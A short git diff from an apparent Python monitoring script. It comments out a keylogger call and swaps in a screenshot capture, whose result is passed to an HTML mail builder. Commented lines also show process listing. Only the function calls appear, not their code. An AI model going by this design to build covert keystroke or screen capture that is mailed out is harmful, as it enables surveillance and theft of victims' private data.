@@ -113,8 +113,11 @@ def main():
         # html = get_processes()
         # request = 'PROCESS get'
 
-        request = 'KEYLOGGER 10'
-        result = get_key_log(10)
+        # request = 'KEYLOGGER 10'
+        # result = get_key_log(10)
+
+        request = 'SCREEN get image'
+        result = screen_shot()
 
         content = {
             'html': html_mail(request, result['html']),
